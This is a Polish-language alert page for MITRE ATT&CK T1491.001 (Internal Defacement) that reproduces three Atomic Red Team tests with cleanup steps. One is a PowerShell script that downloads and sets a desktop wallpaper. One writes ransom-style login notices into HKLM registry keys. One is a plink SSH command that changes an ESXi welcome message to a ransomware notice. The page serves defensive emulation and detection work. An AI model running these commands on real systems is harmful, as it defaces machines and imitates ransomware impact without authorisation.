# Alert: Internal Defacement

Opis scenariusza, podatności lub techniki.

---

**Technika:** T1491.001  
**Nazwa:** Internal Defacement  
**Taktyki:** Impact  
**Status:** Pending  
**Autor:** Krzysztof K.  

---

<!--
Tactics: Impact
Technique ID: T1491.001
Technique Name: Internal Defacement
Status: Pending
--> 


---

## Atomic Red Team – dostępne testy dla tej techniki

### Replace Desktop Wallpaper
**Opis:** 

<b>Polecenia testowe (powershell):</b>
```
$url = "#{url_of_wallpaper}"
$imgLocation = "#{wallpaper_location}"
$orgWallpaper = (Get-ItemProperty -Path Registry::'HKEY_CURRENT_USER\Control Panel\Desktop\' -Name WallPaper).WallPaper
$orgWallpaper | Out-File -FilePath "#{pointer_to_orginal_wallpaper}"
$updateWallpapercode = @' 
using System.Runtime.InteropServices; 
namespace Win32{

    public class Wallpaper{ 
        [DllImport("user32.dll", CharSet=CharSet.Auto)] 
         static extern int SystemParametersInfo (int uAction , int uParam , string lpvParam , int fuWinIni) ; 
         
         public static void SetWallpaper(string thePath){ 
            SystemParametersInfo(20,0,thePath,3); 
        }
    }
} 
'@
$wc = New-Object System.Net.WebClient  
try{  
    $wc.DownloadFile($url, $imgLocation)
    add-type $updateWallpapercode 
    [Win32.Wallpaper]::SetWallpaper($imgLocation)
} 
catch [System.Net.WebException]{  
    Write-Host("Cannot download $url") 
    add-type $updateWallpapercode 
    [Win32.Wallpaper]::SetWallpaper($imgLocation)
} 
finally{    
    $wc.Dispose()  
}
```
[Pobierz test_1.ps1](../../scenarios/atomic_tests\T1491.001\Replace_Desktop_Wallpaper/test_1.ps1)

<b>Polecenia cleanup (powershell):</b>
```
$updateWallpapercode = @' 
using System.Runtime.InteropServices; 
namespace Win32{

    public class Wallpaper{ 
        [DllImport("user32.dll", CharSet=CharSet.Auto)] 
         static extern int SystemParametersInfo (int uAction , int uParam , string lpvParam , int fuWinIni) ; 
         
         public static void SetWallpaper(string thePath){ 
            SystemParametersInfo(20,0,thePath,3); 
        }
    }
} 
'@
if (Test-Path -Path #{pointer_to_orginal_wallpaper} -PathType Leaf) {
     $orgImg = Get-Content -Path "#{pointer_to_orginal_wallpaper}"
     add-type $updateWallpapercode 
     [Win32.Wallpaper]::SetWallpaper($orgImg)
}
Remove-Item "#{pointer_to_orginal_wallpaper}" -ErrorAction Ignore
Remove-Item "#{wallpaper_location}" -ErrorAction Ignore
```
[Pobierz cleanup_1.ps1](../../scenarios/atomic_tests\T1491.001\Replace_Desktop_Wallpaper/cleanup_1.ps1)

### Configure LegalNoticeCaption and LegalNoticeText registry keys to display ransom message
**Opis:** 

<b>Polecenia testowe (powershell):</b>
```
$orgLegalNoticeCaption = (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name LegalNoticeCaption).LegalNoticeCaption
$orgLegalNoticeText = (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name LegalNoticeText).LegalNoticeText
$newLegalNoticeCaption = "#{legal_notice_caption}"
$newLegalNoticeText = "#{legal_notice_text}"
Set-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name LegalNoticeCaption -Value $newLegalNoticeCaption -Type String -Force
Set-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name LegalNoticeText -Value $newLegalNoticeText -Type String -Force
```
[Pobierz test_1.ps1](../../scenarios/atomic_tests\T1491.001\Configure_LegalNoticeCaption_and_LegalNo/test_1.ps1)

<b>Polecenia cleanup (powershell):</b>
```
Set-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name LegalNoticeCaption -Value $orgLegalNoticeCaption -Type String -Force
Set-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name LegalNoticeText -Value $orgLegalNoticeText -Type String -Force
```
[Pobierz cleanup_1.ps1](../../scenarios/atomic_tests\T1491.001\Configure_LegalNoticeCaption_and_LegalNo/cleanup_1.ps1)

### ESXi - Change Welcome Message on Direct Console User Interface (DCUI)
**Opis:** 

<b>Polecenia testowe (cmd):</b>
```
echo "" | "#{plink_file}" -batch "#{vm_host}" -ssh -l #{vm_user} -pw "#{vm_pass}" "esxcli system welcomemsg set -m 'RANSOMWARE-NOTIFICATION'"
```
[Pobierz test_1.cmd](../../scenarios/atomic_tests\T1491.001\ESXi_-_Change_Welcome_Message_on_Direct_/test_1.cmd)

[Zobacz testy na GitHubie](https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1491.001)
